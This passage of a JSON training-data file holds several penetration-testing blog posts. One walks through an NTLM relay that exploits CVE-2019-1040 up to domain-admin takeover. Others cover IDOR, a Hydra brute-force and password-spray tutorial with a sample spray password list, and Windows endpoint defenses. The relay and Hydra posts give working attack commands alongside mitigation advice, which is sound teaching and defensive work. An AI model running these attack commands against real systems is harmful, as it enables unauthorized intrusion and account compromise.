        "output": "Title: \"Bypass NTLM Message Integrity Check - Drop the MIC\"\nTaxonomies: \"Alyssa Snow, Blue Team, External/Internal, General InfoSec Tips & Tricks, How-To, Informational, LLMNR, Red Team\"\nCreation Date: \"Thu, 01 Feb 2024 16:00:00 +0000\"\n\nIn An SMB Relay Race \u2013 How To Exploit LLMNR and SMB Message Signing for Fun and Profit, Jordan Drysdale1 shared the dangers of lack of SMB Signing requirements and demonstrated an attack path which can allow an attacker to escalate from zero to Domain Admin (DA) in an Active Directory environment. In this article, we will build off the SMB relay techniques discussed in that blog post and demonstrate an SMB to LDAP(S) relay attack. \n\nBackground\n\nMachine Account Quota\n\nThe domain attribute used to determine how many computers a user can join to the domain is called ms-ds-machineaccountquota.2 By default, any authenticated domain user can join up to 10 computers to an Active Directory domain. Joining a computer to the domain creates a domain object (computer object).\n\nPowerShell Get Machine Account Quota\n\nThis configuration can be dangerous. Joining a computer to the domain should require approval from an administrator and an organization should have processes in place to ensure that domain computers have the standard security configurations, group policies, endpoint protection applied. Additionally, the process should update the organization's device inventory. \n\nMessage Integrity\n\nImagine we have gained a foothold in the target organization Foobar's environment. LDAP is only available on domain controllers. Therefore, we must target a domain controller in an LDAP relay attack. We have performed some basic reconnaissance and located the target domain controller DC01.foobar.com (10.10.10.1).\n\nWe can set up an LDAP relay targeting the discovered domain controller using the following Impacket3 ntlmrelayx.py arguments:\n\n-t: Target to relay the credentials to\n\n-wh: Enable serving a WPAD file for Proxy Authentication attack, setting the proxy host\n\n--add-computer - create domain computer object\n\n-smb2support - SMB version 2 support\n\nThe full command:\n\nntlmrelayx.py \\\n -t ldaps://10.10.10.1 \\\n -wh bhispad@foobar.com \\\n -smb2support\n\nAs demonstrated in the figure below, we received a connection via SMB. However, attempting to relay SMB to LDAP resulted in the following error: \"[!] The client requested signing. Relaying to LDAP will not work!  (This usually happens when relaying from SMB to LDAP).\"\n\nSMB to LDAP Connection Failed\n\nThis behavior is expected. Typically, SMB traffic cannot be relayed to LDAP(S). NTLM authentication consists of three message types: NTLM_NEGOTIATE, NTLM_CHALLENGE, and NTLM_AUTHENTICATE. A field known as the Message Integrity Code was added to the NTLM_AUTHENTICATE message to prevent message tampering. \n\nA vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass the NTLM Message Integrity Check (MIC).4 This issue is known as the \"drop the MIC\" vulnerability and allows an attacker machine-in-the-middle position to tamper with the NTLM authentication by removing the integrity check. When MIC is not included, the connection from SMB can be relayed to LDAPS. \n\nExploiting CVE-2019-1040\n\nOnce again, let's imagine we have gained a foothold in the target organization Foobar's environment. At this point, we have network level access, and we located the target domain controller DC01.foobar.com (10.10.10.1).\n\nTo provide a brief initial attack summary:\n\nConfigure NTLMRelayx to relay NTLM authentication to the target the domain controller and remove message integrity\n\nConfigure Responder poisoner with SMB and HTTP servers disabled\n\nWait for incoming credentials\n\nWe can exploit systems vulnerable to CVE-2019-10405 and relay SMB connections to LDAPS by adding the --remove-mic flag to our Impacket command. Assuming the target domain has the default machine account quota or a policy greater than zero, we can use the --add-computer flag to create a computer object. If the attack is successful, a computer object with the name \"snowmachine2$\" would be added to the target domain. \n\nThe full command is shown below.\n\nntlmrelayx.py \\\n -t ldaps://10.10.10.1 \\\n -wh bhispad@foobar.com \\\n --add-computer 'snowmachine2' \\\n --remove-mic \\\n -smb2support\n\nNext, we will configure Responder to poison LLMNR and NetBIOS traffic and automatically pass the NTLM authentication to our Impacket relay by turning the SMB and HTTP servers off. To turn off the Responder servers, we must edit the Responder.conf file:\n\nResponder Configuration\n\nAs shown in the figure below, the relay attack was successful. Credentials for a low privileged user account named FOOBAR/bspears were relayed over LDAPS to create the computer object snowmachine2$. \n\nCreate Domain Computer Object\n\nWe have effectively escalated from network access to domain account access. We can test our computer account credentials using CrackMapExec6 and query the ms-ds-machineaccountquota. \n\ncrackmapexec ldap DC01.foobar.com -u snowmachine2$ -p REDACTED -M MAQ\n\n Authenticate as Snowmachine2$ and Get MAQ \n\nWe can use these domain credentials to enumerate domain information and explore paths of privilege escalation.\n\nDomain Takeover\n\nIf we have two domain controllers, and at least one domain controller can be coerced to authenticate to our attacker machine, we can expand upon this attack by relaying credentials from one domain controller to another and creating a computer object with delegation rights to a domain controller.\n\nScenario Details:\n\nDomain Controller 1: DC01.foobar.com (10.10.10.1)\n\nDomain Controller 2: DC02.foobar.com (10.10.10.22)\n\nAttacker Machine: 10.10.10.200\n\nOwned User: snowmachine2$ (can use any domain user account)\n\nKnown Domain Administrator Account: DA_Dan\n\nWe can elevate privileges from a standard domain computer account (snowmachine2$) to a domain administrator account by following the procedure outlined below:\n\nCoerce domain controller DC02 (10.10.10.22) to authenticate to our attacker machine.\n\nRelay the hash obtained from the domain controller to LDAPS on target domain controller DC01 (10.10.10.1) and create another domain object with delegation rights to DC02.\n\nUse the new computer object to request a service ticket on behalf of the domain administrator (DA_Dan) to impersonate the domain administrator. \n\nBy adding the --delegate-access flag to our ntlmrelayx.py command, we can tell ntlmrelayx to create a computer object with delegation access to the relayed account.:\n\nntlmrelayx.py\n -t ldaps://DC01.foobar.com \\\n -wh bhispad \\\n --add-computer 'DcMachine' \\\n --delegate-access\\\n --remove-mic \\\n -smb2support\n\nCoercer7 is a python tool used to coerce Windows machines to authenticate to an attacker machine by abusing various vulnerable RPC functions.\n\nUsing the domain credentials obtained from our new computer account snowmachine2$, we can use Coercer to force the victim machine (DC02) to authenticate to the attacker host (10.10.10.200).\n\n**Side Note: In some cases, a relay attack may not require domain credentials. For example, if the victim host is not patched against CVE-2021-36942.8**\n\nThe Coercer arguments required are as follows:\n\n-u - Domain Username\n-p - Password for User \n-d - Target Domain\n-l - Listener IP (Our Relay)\n-t - Target\n\nThe complete Coercer command is shown below.\n\ncoercer coerce \\\n -u snowmachine2$ \\\n -p REDACTED \\\n -d foobar.com \\\n -l 10.10.10.200 \\\n -t DC02.foobar.com\n\nThe Coercer response shown below [+] (ERROR_BAD_NETPATH) indicated that the coercion was successful. \n\nCoerce Domain Controller DC02\n\nAs shown in the figure below, we successfully created a computer object with Delegation Rights to DC02.\n\nCreate Domain Computer\n\nOur new computer account, DcMachine$ was created with privileges that allow the account to impersonate any user on the domain controller DC02, essentially any domain account including a Domain Admin.\n\nLet's demonstrate this by impersonating the domain admin DA_Dan. To impersonate the domain admin, we will use Impacket's getST module to request a Kerberos ticket on behalf of DA_Dan.\n\ngetST.py -spn 'cifs/DC02.foobar.come' \\\n 'foobar.com/DcMachine$' \\\n -impersonate 'DA_Dan' \\\n -dc-ip 10.10.10.1 \nexport KRB5CCNAME=DA_Dan.ccache\n\nGet Service Ticket for DA_Dan\n\nUsing the Kerberos authentication, we can establish an interactive shell on DC02 impersonating the domain admin DA_Dan.\n\nwmiexec.py -k -no-pass FOOBAR.COM/'DA_Dan'@DC02.foobar.com\n\nImpersonate Domain Administrator DA_Dan\n\nDomain Administrator DA_Dan\n\nTo summarize, we successfully escalate privileges from network access to domain administrator via two relay attacks. Each attack relayed an incoming SMB connection to an LDAPS connection, which was possible because the target systems were not patched against CVE-2019-1040.\n\nThe first attack allowed us to gain our initial set of domain account credentials by relaying SMB connections to LDAPS.\n\nNext, we elevated privileges from a standard domain computer account to a domain administrator account via a second relay attack which involved coercing a domain controller to authenticate to our attacker machine and creating another computer object with delegation rights to the domain controller.\n\nSo, How Do We Prevent & Detect Such Attacks?\n\nWeak Active Directory Object Creation:\n\nConfigure notifications to key personnel when new domain objects are added\n\nEnsure all newly added computer objects are placed in the proper OU and appropriate Group Policies are applied\n\nUpdate the organization's authorized device inventory when a new computer joined the domain\n\nReview the MS-DS-MachineAccountQuota attribute and disallow non-administrative computer joins to the domain \n\nNetwork Poisoning and Relay Attacks:\n\nEnable SMB Signing on all systems\n\nDisable LLMNR on all clients via Group Policy Object (GPO)\n\nDisable NetBIOS Name Server (NBNS)\n\nDisable the Proxy Auto detection via Group Policy\n\nDisable NTLM\n\nEnsure all systems are patched against CVE-2019-1040\n\nImplement detections for malicious RPC calls and consider implementing RPCFirewall\n\nAdditional Resources\n\nhttps://www.blackhillsinfosec.com/mitm6-strikes-again-the-dark-side-of-ipv6/\n\nhttps://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/\n\nhttps://www.antisyphontraining.com/event/hacking-active-directory-fundamentals-and-techniques/\n\nhttps://www.blackhillsinfosec.com/impacket-offense-basics-with-an-azure-lab/\n\nhttps://www.blackhillsinfosec.com/impacket-defense-basics-with-an-azure-lab/\n\nhttps://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/\n\nhttps://support.microsoft.com/en-us/topic/kb4034879-use-the-ldapenforcechannelbinding-registry-entry-to-make-ldap-authentication-over-ssl-tls-more-secure-e9ecfa27-5e57-8519-6ba3-d2c06b21812e\n\nhttps://github.com/zeronetworks/rpcfirewall\n\nhttps://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota\n\nhttps://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity\n\nhttps://www.bleepingcomputer.com/news/security/microsoft-ntlm-flaws-expose-all-windows-machines-to-rce-attacks/\n\nhttps://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-1040\n\nhttps://securityboulevard.com/2019/06/drop-the-mic-cve-2019-1040/\n\nhttps://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1040/\n\nReferences\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Revisiting Insecure Direct Object Reference (IDOR)\"\nTaxonomies: \"External/Internal, Finding, General InfoSec Tips & Tricks, How-To, Melissa Bruno, Web App, IDOR, Insecure Direct Object Reference\"\nCreation Date: \"Thu, 08 Feb 2024 16:00:00 +0000\"\n\nThe new year has begun, and as a penetration tester at Black Hills Information Security, one thing really struck me as I reflected on 2023: a concerningly large number of web applications suffered from insecure direct object reference (IDOR) vulnerabilities that were critical in severity because they exposed highly sensitive data. In the last four months of 2023 alone, I discovered five such instances. This issue is slipping through the cracks with alarming frequency, even in web applications that are otherwise fairly well-secured.\n\nThose of you who are unfamiliar with IDOR should consider checking out Kelsey Bellew\u2019s blog post from February 2016 HERE for a great high-level overview. I will also be covering the basics of IDOR here, as well as additional tips for preventing and detecting it.\n\nIn essence, IDOR is when an authenticated user of a web application is able to gain unauthorized access to resources by changing the value of an identifier in an HTTP request. There are a number of spots in the HTTP request where these identifiers may be, such as a URL query strings, HTTP POST parameters, or even in cookie values.\n\nIf the web application makes an HTTP POST request to retrieve the name, email address, and phone number of the current user with an ID of 10001 and changing the ID in the request to 10009 returns the name, email address, and phone number of an entirely unrelated user, then IDOR has been successfully exploited. This is a consequence of the application failing to check whether a user is authorized to access a particular set of information while carrying out a request.\n\nBelow is a step-by-step example of IDOR exploitation. First, the user, Sideshow Bob, accesses his own data through normal means at the URL, /user/10001.json.\n\nAuthorized Access to User Data\n\nThe HTTP request that returned the above data is intercepted with Burp Suite and sent to the Burp Suite Intruder module. The number 1 in the URI /user/10001.json is specified as a payload position.\n\nBurp Suite Intruder \u2013 Payload Position Configuration\n\nNext, the Burp Suite Intruder is configured to inject the numbers 0 through 9 into the payload position.\n\nBurp Suite Intruder - Payload Set Configuration\n\nThe resulting Burp Suite Intruder output returns not just Sideshow Bob\u2019s data, but also Bart Simpson\u2019s data at /user/10009.json, which Sideshow Bob was not intended to view.\n\nBurp Suite Intruder Results - Unauthorized Access to Another User\u2019s Data\n\nThe fact that IDOR, by definition, can only be performed post-authentication may give some developers a false sense of security regarding this issue. However, if the vulnerable web application has a registration page allowing anyone to make a new user account, the information is as good as public because anyone on the internet could make an account and access that data. Even if account registration is restricted, the potential for damage is so substantial that the risk from IDOR attacks should not be taken lightly.\n\nBecause unsecured identifiers may be used while the application carries out a variety of actions, the consequences of IDOR can be wide-ranging. Examples of IDOR attacks that I have successfully exploited over just the past few months include:\n\nIDOR affecting password change functionality, which made it possible to change the password of any user in the application.\n\nIDOR that allowed low-privilege users to perform admin functions, such as user impersonation, password changes, and modification or deletion of user accounts.\n\nIDOR that disclosed large amounts of personal information about every user in the system, including full names, mailing addresses, email addresses, phone numbers, and other sensitive data. This information can be very damaging to a company\u2019s reputation if it winds up in a data dump on the dark web.\n\nPreventing and addressing IDOR requires both developers and penetration testers to be proactive, with the steps I\u2019ve outlined below.\n\nTips for Testers \u2013 Discovering IDOR\n\nExamine HTTP requests while you are exploring the application and test for IDOR using the Burp Suite Intruder as described earlier in this blog post. Care needs to be taken when performing these tests in production, but whenever possible, it is prudent to inject hundreds or thousands of numbers as payloads, as numeric identifiers are not always sequential, and a large number of guesses may be necessary to successfully identify IDOR.\n\nKnow what information in the environment is considered sensitive. Sometimes it is obvious which data is sensitive, but sometimes it\u2019s not. Work with the stakeholders to understand which data they are most concerned about.\n\nOnce you have identified which data is most sensitive, identify which endpoints return this data and prioritize testing those, especially if there is a limit to how much time you can spend testing an application.\n\nBe extremely thorough. Even if access controls are enforced correctly in 99 out of 100 endpoints, that one unenforced endpoint can expose a lot of information.\n\nWhenever possible, perform testing with two user accounts per privilege level. If there are so many user account privilege levels that this would be impractical, aim to test with user accounts that have the least level of privilege and the highest level of privilege at a minimum.\n\nBe wary of false alarms. Authenticated users are often intended to access certain personally identifiable information in certain contexts. For example, an application accessible only to company employees may have a company directory with employees\u2019 contact information so that coworkers can get in touch with one another. Business addresses and business phone numbers for sales representatives may be appropriate to reveal even without authentication, whereas the same individuals\u2019 home addresses may not be appropriate to reveal even to authenticated users. Context is key.\n\nThe Burp Suite extension, Autorize, is helpful for automating access control checks, particularly when the tester has access to multiple user accounts.\n\nTips for Developers \u2013 Preventing IDOR\n\nEvery time a user accesses a resource or performs an action, a check needs to be performed to verify that the user is authorized to access that resource or perform that action.\n\nIDOR needs to be considered every time new code is deployed. Most of the time when I discover IDOR, access controls are enforced correctly 99% percent of the time, but one or two endpoints slip past any previously utilized quality checks and wreak havoc.\n\nKeep in mind that IDOR is a business logic flaw. Vulnerability scanners may be great at detecting things like cross-site scripting, but they aren\u2019t going to pick up on nuanced logic such as \u201cCustomer A should have access to Customer B\u2019s data, but not Customer C\u2019s\u201d data.\n\nUsing unpredictable identifiers, such as GUIDs, may make IDOR more difficult to discover, but it is not a replacement for correctly enforcing security controls. If the GUIDs are disclosed anywhere in the application or sent over a URL, IDOR may still be exploited.\n\nConsider adding checks for IDOR as integration tests or acceptance tests as described here.\n\nHopefully this post has given you some things to think about regarding IDOR. Given how prolific and consequential this vulnerability is, we all need to do our part to keep an eye out for it.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Hacking with Hydra\"\nTaxonomies: \"External/Internal, Informational, InfoSec 101, John Malone, Password Spray, Red Team\"\nCreation Date: \"Thu, 15 Feb 2024 17:00:00 +0000\"\n\nWhat is Hydra?\n\nHydra is a tool that can be used for password spraying. Let\u2019s begin by defining the term \u201cpassword spray.\" A password spray is where an attacker defines one password, such as \u201cWinter2024\u201d and tries it against a list of obtained usernames. If one of these accounts uses \u201cWinter2024\u201d as a password, then the attacker may be able to access that resource.\n\nPassword spraying and brute force attacks are commonly used by attackers who wish to access resources that are exposed on the internet or on internal networks. A good password spray will use passwords that are commonly used or that encompass traits that concern the organization or resource that you are attacking.\n\nMoving forward in this article, we will explore applicable situations for performing a brute force attack and password sprays with Hydra. As always, make sure you have proper permission before performing password attacks against targets that you do not own.\n\nPerforming a Brute Force Attack\n\nAI-generated image\n\nFor this step, we are going to look at performing a password spray against a vulnerable web application that is hosted on Try Hack Me, known as Mr. Robot CTF, which has a theme related to the TV show of the same name. While this will not serve as a full CTF walkthrough, the concept used here is sufficient enough to demonstrate a brute force attack in action and how it would work in a real-life setting.\n\nDuring this exercise, the tester is required to perform a password-based attack to gain access.\n\nIn the below screenshot, we can observe that we have arrived at a WordPress login portal. Seeing how this is a website, we can use Hydra to password spray with HTTP POST requests.\n\nWordPress Login Portal\n\nTo capture the request, we can simply open our browser\u2019s developer console and then issue a simple username and password request, such as admin/admin, into the login form in the browser. Upon submitting, we are informed that our username is invalid. Additionally, our developer console can now be used to view the POST request along with the payload that was used to make it. The keen eye may also observe that the username is verbose in nature, which can allow us to make the assumption that username enumeration may be possible.\n\nInvalid Username Error\n\nSeeing how this is a Mr. Robot themed CTF box, we can test this by trying a variety of names from the Mr. Robot TV show.\n\nangela\n\ndarlene\n\nelliot\n\nirving\n\njoanna\n\nrobot\n\ntrenton\n\ntyrell\n\nwhiterose\n\nAfter submitting the credentials, our developer console now contains the following payload, which contains the log and pwd parameters that display our entered credentials: \n\nlog=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.192.106%2Fwp-admin%2F&testcookie=1\n\nDeveloper Console Contains Request Payload\n\nThis payload can be inserted into a command with the following changes to instruct Hydra to perform username enumeration. The below command uses Hydra\u2019s -L flag to specify our list of users, -p to use a chosen password, and the http-post-form switch to instruct Hydra to use our captured HTTP POST request. It should be noted that the http-post-form switch contains a value that is made up of:\n\nthe target page for spraying, which is necessary to complete our request.\n\nthe request itself, which consists of the payload from our developer console.\n\nthe error message that presents. This instructs Hydra to look for results that do not contain the \u201cInvalid Username\u201d error.\n\nhydra -L users.txt -p admin 10.10.192.106 http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.192.106%2Fwp-admin%2F&testcookie=1:Invalid Username\"\n\nThis returns feedback from Hydra that shows that elliot returned an error that did not match \u201cInvalid Username.\" However, Hydra will claim that we have a match for the password. This is not true, however. We are likely receiving a different error than \u201cInvalid Username.\" We can visit the browser and try this manually to verify our findings.\n\nHydra Enumerates the elliot Username as Valid\n\nEntering elliot into our browser reveals another verbose error, but this time it is a different one that concerns password validity. \n\nVerbose Password Error\n\nNow that we know that elliot is a valid user, we can perform a brute force attack against the account. This is done by substituting some switches in our below Hydra command. Notably, the -l switch is used to specify a user, and -P is used to specify our file containing passwords. Additionally, our error message is being changed to look for a response that does not contain the above error. Seeing how a true password match will fail to return an error at all, we can assume that this time we will not be receiving a false positive when a match is discovered.\n\nhydra -l elliot -P passwords.txt 10.10.192.106 http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.192.106%2Fwp-admin%2F&testcookie=1:The password you entered for the username\"\n\nUpon running this command, we observe that the username elliot is tested repeatedly against a variety of passwords. A positive hit is identified for ER28-0652!\n\nHydra Brute Forces the Password for elliot\n\nReturning to our login page and entering the password results in us being taken into the webserver\u2019s administrative console. From here, we could examine the version of WordPress and look for vulnerabilities that could allow us to obtain a shell on the system. This is outside the scope of this article though, so we will not be covering it here.\n\nAccess Granted!\n\nPerforming a Password Spray\n\nAI-generated image\n\nWe now have a valid password for elliot. While not an official part of the Mr. Robot CTF challenge on TryHackMe, BHIS created a secondary machine with a similar theme.\n\nBefore we progress further, I want to share a best practice for penetration testing that you should strongly consider while performing authorized testing activity or while working on CTFs or a certification. Whenever you obtain a credential or password hash, it never hurts to attempt to use that credential elsewhere \ud83d\ude09. You never know when something just might be a default password or when a user may be reusing the same password across multiple resources. IN SHORT, ALWAYS TRY CREDS EVERYWHERE.\n\nPerforming an Nmap scan on the host located at 192.168.80.134, we observe that an SSH port is open.\n\nnmap -Pn -T4 -sV 192.168.80.134\n\nNmap Discovers Open SSH Port\n\nPerforming another Nmap scan with the below command, we are able to observe that the SSH server supports password-based authentication, which will allow us to perform password sprays and brute force attacks with Hydra.\n\nnmap -Pn -T4 -sV --script=ssh-auth-methods.nse 192.168.80.134\n\nSSH Server Supports Password-Based Authentication\n\nPerforming a password spray is very similar to performing a brute force attack (except that it is the complete opposite). Instead of testing many passwords against one username, we are testing one password against many usernames.\n\nWe can then use the below Hydra command to password spray the list of users we created with the password ER28-0652. \n\nhydra -L users.txt -p ER28-0652 -V ssh://192.168.80.134\n\nThis time, we can see that we receive another positive hit for elliot, which tells us that Elliot has been reusing his password across his accounts.\n\nHydra Performs a Successful Password Spray\n\nWe can then perform another password spray with a simpler password, such as \u201crobot.\" This time, we observe that multiple accounts are accessed. This suggests that \u201crobot\u201d is a default password for new users.\n\n Multiple Accounts Use Same Password \n\nAfter finding these credentials, we can log in on an account of our choice.\n\nssh elliot@192.168.80.134\n\nAccess Gained through SSH\n\nOn an actual penetration test, this would be an excellent time to perform additional enumeration on the computer\u2019s subnet and to begin looking for privilege escalation and persistence vectors.\n\nBest Practices for Spraying\n\nAI-generated image\n\nNow that we have the demonstration out of the way, let\u2019s briefly touch base on how to find good passwords for spraying. When you are going to password spray, it is best to try and use passwords that are simple in nature and that could be reasonably picked by an unassuming victim. This includes passwords that contain:\n\nSimple terms such as \u201cpassword\u201d \u201cwelcome\u201d and \u201cletmein\u201d, which may or may not include leet speak substitutions (password vs passw0rd).\n\nThe names of seasons \u2013 Winter, Spring, Summer, Fall or Autumn\n\nThe current year or previous year - that being 2023 or 2024 at the time of this article.\n\nThe name of the state where the organization is headquartered.\n\nThe name of the organization.\n\nPolitical figures, such as President Trump and President Biden.\n\nThat use or omit a special character at the end. Using an exclamation point is always a safe bet.\n\nLet\u2019s put a few of these bullets together and come up with a list of passwords to use for password spraying a pretend school based in Illinois that has a peacock as its mascot.\n\nPretendSchool2023!\n\nWinter2024!\n\nPassword123!\n\nIllinois2024!\n\nPeacock2024!\n\nWelcome2023\n\nTrump2024!\n\nBiden2024!\n\nLetmein123\n\npassw0rd\n\nAlways try and use passwords that are associated with the organization or service that you are spraying. These are much more likely to provide results than something like 2349823h9fhu234r$#$$$2SASQUATCH. Lastly, if you\u2019re looking for a solid collection of wordlists, I strongly recommend the SecList collection (https://github.com/danielmiessler/SecLists).\n\nClosing Statements\n\nPassword-based attacks are a common attack vector in the wild and are evidence of why multi-factor authentication should be used to protect user resources. Hydra and tools like it are crafted to attack passwords and can be used to gain access to systems where a password is properly guessed. Practicing good password security and using multi-factor authentication is essential, as that will greatly reduce the likelihood of an attacker being able to successfully breach an account.\n\nHappy hacking, and stay safe and legal out there.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Initial Access Operations Part 1: The Windows Endpoint Defense Technology Landscape\"\nTaxonomies: \"Informational, InfoSec 301, Joff Thyer, Red Team\"\nCreation Date: \"Thu, 22 Feb 2024 16:00:00 +0000\"\n\nToday\u2019s endpoint defense landscape on the Windows desktop platform is rich with product offerings of quite sophisticated capabilities. Beyond the world of antivirus products, Extended Detection and Response (XDR), and complementary behavioral analysis approaches provide a broad coverage of both initial access malware techniques, as well as post exploitation activity detection.\n\nAnybody participating in Red Teaming activities today will tell you that gaining initial access through the execution of some binary artifact is much harder now than ever before. Even if access is gained on a Windows desktop platform, post exploitation activities by common command and control platforms are well studied and with well-instrumented defense responses in mature environments.\n\nThis enhanced endpoint defense posture has resulted in both Red Teamers and Threat Actors shifting tactics to other vulnerable areas such as cloud resource misconfiguration, team collaboration tools, software developer supply chains, and the ever-present credential (mis)management challenges that persist across 0road array of information technology solutions.\n\nThe defensive technique/technology list below is focused on defense product techniques with brief mention of integrated Windows features. There exists a host of other Windows Operating System security features, such as: Address Space Layout Randomization (ASLR) , Data Exception Prevention (DEP), and Control Flow Guard (CFG), for example, which is not the focus of this article.\n\nExamples of defense technique coverage include items such as the following:\n\nStatic artifact analysis\n\nEvent tracing for Windows\n\nWindows kernel notification callbacks\n\nWindows DLL API hooking\n\nProcess Tree Analysis\n\nMemory Page Scanning\n\nCall Stack Tracing\n\nWindows 10/11 hardware enforced stack protection\n\nKernel driver block listing\n\nI won\u2019t bother speaking about static artifact analysis too much, since it\u2019s fairly self-evident, given entities like Virus Total and the like. Briefly, it is true to say that any static artifact with a high entropy score, i.e. large amounts of embedded encrypted data, will likely drive an immediate detection from most products.  Having said that, let\u2019s cover some of these other techniques.\n\nEvent Tracing for Windows (ETW)\n\nThis technology implements tracing and event logging for both user mode applications and kernel driver activities. The Windows Event Tracing API is implemented in three components:\n\nControllers which can start or stop event tracing sessions.\n\nProviders which supply the event data itself\n\nConsumers which consume the event data\n\nEvent Tracing ArchitectureSource: https://learn.microsoft.com/en-us/windows/win32/etw/about-event-tracing\n\nThere are three types of providers, Managed Object Format (MOF), Windows software trace preprocessor (WPP), and finally trace logging, which is what provides the ETW logging. Needless to say, if you subscribe as a consumer to ETW data, you will receive a huge volume of trace logging, which includes almost any Windows API call that can be made by an application and is quite literally a \u201cfire hose\u201d of information.\n\nWindows Kernel Notification Callbacks\n\nBack in the bad, old, Wild West days, many defense products would place redirection hooks into the System Service Descriptor Table (SSDT) to receive the necessary telemetry on application activities. Microsoft (rightfully) decided that they didn\u2019t particularly like this technique, since any small 3rd party developer software defects could (and did) result in destabilizing the Windows kernel. When Windows Vista was released, Microsoft released an accompanying change called Patch Guard (Kernel Patch Protection) which enforced that 3rd party vendors could no longer place hooks into the SSDT among other things.As you can imagine, many of the defense vendors did particular like the idea of a loss in telemetry, and thus, Microsoft did provide a feature called Kernel Notification Callbacks. This feature has been steadily enhanced since its initial release.\n\nKernel Notification Callbacks allowed a signed kernel driver to register a callback routine in order to receive notifications. At a high level, the different notifications include:\n\nPsSetCreateProcessNotifyRoutine\n\nRegisters a callback routine for process creation events\n\nPsSetCreateThreadNotifyRoutine\n\nRegisters a callback routine for thread creation events\n\nPsSetLoadImageNotifyRoutine\n\nRegisters a callback routine for image load events\n\nObRegisterCallbacks\n\nRegisters a callback routine for object changes such as when a process, thread, or desktop handle is opened or duplicated.\n\nCmRegisterCallback\n\nRegisters a callback routine for any Windows registry operations\n\nGiven this granularity of notification information, it should be no surprise that defense vendors used signed drivers that will leverage a number of the above notifications.\n\nThe advantage of doing this at a kernel level is a smaller chance of malware tampering with the callback registration or data.  Although be aware that signed and vulnerable kernel drivers exist that are not on the block list, which presents a risk of tampering.\n\nWindows DLL API Hooking\n\nAPI hooking has long been a technique to redirect code execution in a Windows user mode process. This can be performed on almost any loaded image/module in a process, but is, however, most commonly performed on \u201cntdll.dll\u201d, which is always loaded along with \u201ckernel32.dll\u201d and now \u201ckernelbase.dll\u201d, in all application processes.\n\nThe Windows Native API is a set of application programming interfaces used in the Windows operating system. \u201cntdll.dll\u201d is a dynamic-link library that contains a collection of functions that are part of the Windows native API.  \u201cntdll.dll\u201d system calls (syscalls), are low-level functions that provide an interface between user-mode applications and the Windows kernel.\n\nWhen a user-mode application needs to perform a privileged operation or interact with the operating system's kernel, it makes a system call. Instead of directly invoking kernel functions, applications call functions within \u201cntdll.dll\u201d, which in turn, makes the necessary system calls to the Windows kernel.\n\nLet\u2019s look at an example of the \u201cntdll.dll\u201d API call \u201cNtWriteVirtualMemory()\u201d.  For the image below, I started up the Windows debugger (WinDBG) and a \u201cnotepad.exe\u201d process (because we love picking on notepad).  After attaching the debugger to the process, I disassembled the API call.\n\nFirst note that this is a 64-bit process, and we are staying there because there is a dwindling amount of 32-bit systems these days anyway. The first two machine code opcodes below are doing the following:\n\n\u201cmov r10,rcx\u201d: save a copy of RCX in the R10 register\n\n\u201cmov eax,: move the system call number into the EAX register. (EAX is just a 32-bit notation for the RCX 64-bit register)\n\nNext, there is a test to see whether we should be using the \u201cint 0x2e\u201d interrupt driven system call convention or the \u201csyscall\u201d instruction.  Either way, a system call is going to occur!\n\nNow, because we can open any process that we have the appropriate security token rights to open, we can also overwrite virtual memory in a process.\n\nAs it turns out, we can replace the second opcode with a JMP instruction to redirect the code to a new memory location. Conveniently, a 32-bit short JMP instruction fits nicely into the 5 bytes available to us.\n\nOverall, the sequence to hook an API in \u201cntdll.dll\u201d for a defensive product might look something like this:\n\nThe defensive product receives some kernel notification callback that it considers \u201cinteresting.\u201d\n\nThe defensive product opens the application process and injects into the process some code to load its own signed DLL module. Alternatively, the defensive product may be configured such that its own signed DLL module is loaded for all process creation, in which case, this step would be unnecessary.\n\nThe defensive product finds the address of the \u201cntdll.dll\u201d API of interest and overwrites the second opcode with a JMP instruction into code of the newly loaded DLL/module.\n\nDepending on the DLL loaded, some sort of defensive scanning actions or just further notification or even perhaps a direct blocking on the API call is made.  If not blocked, the defensive product DLL will move the correct SYSCALL number into the EAX register and then JMP back to the SYSCALL instruction of the original API.[ME1] \n\n\u201cntdll.dll\u201d API hooking may or may not be implemented dynamically using kernel notification callbacks. In some instances, the defense product design might hook many of the \u201cntdll.dll\u201d API\u2019s upon an image load notification for all processes and leave them hooked for the lifetime of the processes.\n\nVisually, the whole sequence can be represented as follows:\n\nEvent Driven API Hooking\n\nProcess Tree Analysis\n\nThe idea here is to create an internal representation of the running processes on a system and their hierarchical relationships. The parent child relationship data can be compared with a set of static rules, and/or processed through an artificial intelligence model in order to identify abnormal outliers. A simple example might be to consider the PowerShell process as potentially suspicious if it is a child process of an Excel spreadsheet. \n\nMemory Page Scanning\n\nIt is not uncommon for malware to allocate some pages of virtual memory, copy some machine code (shellcode) to that memory, set the page(s) to the PAGE_EXECUTE_READ permission and create a thread pointing to the start address of the memory allocated. Virtual memory is a memory management technique that provides an abstraction of the physical memory resource. On Windows, and many other operating systems, a page of virtual memory consists of 4096 contiguous allocated bytes.\n\nThe thread of execution created could be in the same running process that the malware started or could be injected into a foreign process accessed by the malware, assuming the security token of the malware process has sufficient rights to access the foreign process.\n\nDefensive products can use the \u201cntdll.dll\u201d API \u201cNtQueryInformationThread()\u201d to determine any process thread\u2019s starting address. In addition, the kernel32.dll API \u201cVirtualQuery()\u201d or \u201cVirtualQueryEx()\u201d can be used to obtain allocated virtual memory properties. The \u201ckernel32.dll\u201d API functions ending in \u201cEx\u201d are typically those which can access a tertiary process using an open process handle as opposed to the local process. It is also possible to use the \u201cntdll.dll\u201d API call \u201cNtReadVirtualMemory()\u201d to directly examine memory contents 